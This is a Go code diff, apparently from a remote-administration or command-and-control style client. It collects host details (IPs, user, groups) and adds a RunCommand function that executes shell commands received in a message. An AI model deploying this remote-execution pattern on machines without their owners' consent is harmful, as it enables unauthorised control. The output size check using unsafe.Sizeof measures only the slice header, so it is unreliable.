@@ -6,31 +6,37 @@ like getting a username or file path.
 */
 
 import (
-	//"os"
 	"encoding/json"
 	"errors"
 	"io/ioutil"
 	"net"
 	"net/http"
+	"os/exec"
 	"os/user"
 	"runtime"
 	"strings"
+	"unsafe"
+
+	"github.com/mattn/go-shellwords"
+	"github.com/mikeflynn/the-fearsome-five/shared"
 )
 
 type System struct {
-	UUID   string `json:"uuid"`
-	OS     string `json:"os"`
-	LanIP  string `json:"ip_internal"`
-	ExtIP  string `json:"ip_external"`
-	User   string `json:"user"`
-	Groups string `json:"groups"`
+	ClientVersion string `json:"client_version"`
+	UUID          string `json:"uuid"`
+	OS            string `json:"os"`
+	LanIP         string `json:"ip_internal"`
+	ExtIP         string `json:"ip_external"`
+	User          string `json:"user"`
+	Groups        string `json:"groups"`
 }
 
 func InitSystem() *System {
 	sys := &System{
-		UUID:   "",
-		OS:     runtime.GOOS,
-		Groups: "",
+		ClientVersion: VERSION,
+		UUID:          "",
+		OS:            runtime.GOOS,
+		Groups:        "",
 	}
 
 	if err := sys.load(); err != nil {
@@ -131,8 +137,25 @@ func (sys *System) GetExternalIP(reload bool) (string, error) {
 	return sys.ExtIP, nil
 }
 
-func (sys *System) RunCommand() (string, error) {
-	return "", errors.New("Not yet implemented.")
+func (sys *System) RunCommand(message *shared.Message) (string, error) {
+	var cmd *exec.Cmd
+
+	args, err := shellwords.Parse(message.Body)
+	if err != nil {
+		return "", err
+	}
+
+	cmd = exec.Command(args[0], args[1:]...)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return "", err
+	}
+
+	if unsafe.Sizeof(out) > uintptr(shared.MaxMessageSize) {
+		return "", errors.New("Output too large for return message.")
+	}
+
+	return string(out), nil
 }
 
 func (sys *System) SaveFile() (string, error) {
